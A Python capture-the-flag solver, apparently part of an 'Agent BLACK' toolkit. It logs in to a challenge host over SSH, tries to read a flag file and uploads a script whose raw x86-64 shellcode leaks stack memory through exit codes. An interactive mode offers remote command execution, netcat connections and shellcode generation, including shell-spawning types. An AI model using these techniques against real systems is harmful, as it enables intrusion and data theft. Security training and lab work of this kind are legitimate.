#!/usr/bin/env python3
import os
import re
import sys
import asyncio
from pathlib import Path
 
sys.path.insert(0, str(Path(__file__).parent.parent))

from agents.agent_black import AgentBlack
from agent_black.ctf_utils import FLAG_PATTERNS, search_flags

try:
    from external.modules.pwn import PwnModule
except ImportError:
    PwnModule = None

def print_banner():
    print("""
╔═══════════════════════════════════════════════════════════════╗
║     ▄▀█ █▀▀ █▀▀ █▄░█ ▀█▀   █▄▄ █░░ ▄▀█ █▀▀ █▄▀   █▀█ █░█░█ █▄░█    ║
║     █▀█ █▄█ ██▄ █░▀█ ░█░   █▄█ █▄▄ █▀█ █▄▄ █░█   █▀▀ ▀▄▀▄▀ █░▀█    ║
║                                                                    ║
║        Binary Exploitation & PWN Challenge Solver                  ║
╚═══════════════════════════════════════════════════════════════╝
""")

async def solve_wyv3rn():
    print("\n[BLACK PWN] Attempting wyv3rn-player challenge...")
    
    if PwnModule is None:
        print("[!] PwnModule not available. Install pwntools: pip install pwntools")
        return
    
    pwn = PwnModule()
    
    host = os.environ.get("PWN_TARGET_HOST", "127.0.0.1")
    port = int(os.environ.get("PWN_TARGET_PORT", "22"))
    user = os.environ.get("PWN_SSH_USER", "user")
    passwd = os.environ.get("PWN_SSH_PASS", "password")
    
    print(f"[*] Connecting to {host}:{port} via SSH...")
    success, msg = await pwn.connect_ssh(host, port, user, passwd)
    print(f"[*] {msg}")
    
    if not success:
        print("[!] Failed to connect")
        return
    
    print("[*] Checking for flag file...")
    stdout, stderr, code = pwn.ssh_exec("ls -la /home/hacker/")
    print(stdout)
    
    stdout, stderr, code = pwn.ssh_exec("cat /home/hacker/flag 2>/dev/null || echo 'Permission denied'")
    print(f"[*] Flag attempt: {stdout.strip()}")
    
    flags = search_flags(stdout)
    if flags:
        print(f"\n[+] FLAG FOUND: {flags[0]}")
        return
    
    print("[*] Analyzing binary...")
    stdout, stderr, code = pwn.ssh_exec("file /home/hacker/prob")
    print(f"[*] {stdout.strip()}")
    
    print("\n[*] Generating shellcode to leak memory via exit codes...")
    
    script = '''
import subprocess,struct,sys

def run_sc(sc):
    r=subprocess.run(["./prob"],input=sc.ljust(4096,b"\\x90"),capture_output=True)
    return r.returncode & 0xFF

def read_byte(addr):
    sc=b"\\x48\\xbf"+struct.pack("<Q",addr)+b"\\x0f\\xb6\\x3f\\x48\\xc7\\xc0\\x3c\\x00\\x00\\x00\\x0f\\x05"
    return run_sc(sc)

print("[*] Scanning stack for '0' (0x30)...")
for offset in range(0, 0x100, 8):
    sc=b"\\x48\\x89\\xe7\\x48\\x83\\xc7"+bytes([offset])+b"\\x48\\x8b\\x3f\\x0f\\xb6\\x3f\\x48\\xc7\\xc0\\x3c\\x00\\x00\\x00\\x0f\\x05"
    byte=run_sc(sc)
    if byte >= 0x20 and byte < 0x7f:
        print(f"[rsp+0x{offset:02x}]: 0x{byte:02x} ('{chr(byte)}')")
    if byte == 0x30:
        print(f"[!] Found '0' at stack offset 0x{offset:02x}")
'''
    
    print("[*] Uploading exploit script...")
    
    local_script = "/tmp/wyv3rn_exploit.py"
    with open(local_script, "w") as f:
        f.write(script)
    
    pwn.ssh_upload(local_script, "/home/hacker/exploit.py")
    
    print("[*] Running exploit...")
    stdout, stderr, code = pwn.ssh_exec("cd /home/hacker && python3 exploit.py 2>&1", timeout=60)
    print(stdout)
    print(stderr)

async def interactive_mode():
    print_banner()
    
    if PwnModule is None:
        print("[!] PwnModule not available. Install pwntools: pip install pwntools")
        return
    
    pwn = PwnModule()
    agent = None
    
    commands = {
        "help": "Show available commands",
        "connect <host> <port> <user> <pass>": "Connect via SSH",
        "exec <cmd>": "Execute command on remote",
        "nc <host> <port>": "Connect via netcat",
        "analyze <path>": "Analyze binary file",
        "shellcode <type>": "Generate shellcode (exit, execve_sh, cat_flag)",
        "leak <addr> <len>": "Leak memory via exit codes",
        "wyv3rn": "Auto-solve wyv3rn-player challenge",
        "agent": "Load full Agent BLACK",
        "quit": "Exit",
    }
    
    print("Type 'help' for commands\n")
    
    while True:
        try:
            cmd = input("[BLACK PWN] > ").strip()
            if not cmd:
                continue
            
            parts = cmd.split()
            action = parts[0].lower()
            
            if action == "help":
                print("\nAvailable commands:")
                for c, desc in commands.items():
                    print(f"  {c:40} - {desc}")
                print()
            
            elif action == "connect":
                if len(parts) < 5:
                    print("Usage: connect <host> <port> <user> <pass>")
                    continue
                host, port, user, passwd = parts[1], int(parts[2]), parts[3], parts[4]
                success, msg = await pwn.connect_ssh(host, port, user, passwd)
                print(f"[*] {msg}")
            
            elif action == "exec":
                if len(parts) < 2:
                    print("Usage: exec <command>")
                    continue
                command = " ".join(parts[1:])
                stdout, stderr, code = pwn.ssh_exec(command)
                print(stdout)
                if stderr:
                    print(f"[stderr] {stderr}")
                print(f"[exit: {code}]")
            
            elif action == "nc":
                if len(parts) < 3:
                    print("Usage: nc <host> <port>")
                    continue
                host, port = parts[1], int(parts[2])
                success, sock = await pwn.connect_nc(host, port)
                if success:
                    print(f"[+] Connected to {host}:{port}")
                    banner = pwn.nc_recv(sock)
                    print(f"[recv] {banner.decode(errors='ignore')}")
                else:
                    print(f"[-] {sock}")
            
            elif action == "analyze":
                if len(parts) < 2:
                    print("Usage: analyze <binary_path>")
                    continue
                result = pwn.analyze_binary(parts[1])
                for k, v in result.items():
                    print(f"  {k}: {v}")
            
            elif action == "shellcode":
                if len(parts) < 2:
                    print("Usage: shellcode <type>")
                    print("Types: exit, exit_with_code, read_byte_exit, execve_sh, cat_flag")
                    continue
                sc_type = parts[1]
                kwargs = {}
                if sc_type == "exit_with_code" and len(parts) > 2:
                    kwargs["code"] = int(parts[2])
                elif sc_type == "read_byte_exit" and len(parts) > 2:
                    kwargs["addr"] = int(parts[2], 16) if parts[2].startswith("0x") else int(parts[2])
                
                sc = pwn.generate_shellcode(sc_type, **kwargs)
                print(f"[*] Shellcode ({len(sc)} bytes):")
                print(f"    Hex: {sc.hex()}")
                print(f"    Bytes: {repr(sc)}")
            
            elif action == "leak":
                if len(parts) < 3:
                    print("Usage: leak <start_addr_hex> <length>")
                    continue
                addr = int(parts[1], 16) if parts[1].startswith("0x") else int(parts[1])
                length = int(parts[2])
                print(f"[*] Leaking {length} bytes from 0x{addr:x}...")
                leaked = await pwn.leak_memory_via_exit(
                    pwn.target_host, pwn.target_port, "hacker", "hacker",
                    "./prob", addr, length
                )
                print(f"[*] Leaked: {leaked.hex()}")
                print(f"[*] ASCII: {leaked.decode(errors='ignore')}")
            
            elif action == "wyv3rn":
                await solve_wyv3rn()
            
            elif action == "agent":
                print("[*] Loading full Agent BLACK...")
                agent = AgentBlack(load_model=False)
                print("[+] Agent BLACK loaded")
            
            elif action in ("quit", "exit", "q"):
                print("[*] Goodbye!")
                break
            
            else:
                print(f"Unknown command: {action}. Type 'help' for commands.")
        
        except KeyboardInterrupt:
            print("\n[*] Use 'quit' to exit")
        except Exception as e:
            print(f"[!] Error: {e}")

def main():
    if len(sys.argv) > 1:
        if sys.argv[1] == "wyv3rn":
            asyncio.run(solve_wyv3rn())
        elif sys.argv[1] == "help":
            print("Usage: python black_pwn.py [command]")
            print("Commands:")
            print("  wyv3rn    - Auto-solve wyv3rn-player challenge")
            print("  (none)    - Interactive mode")
        else:
            print(f"Unknown command: {sys.argv[1]}")
    else:
        asyncio.run(interactive_mode())

if __name__ == "__main__":
    main()
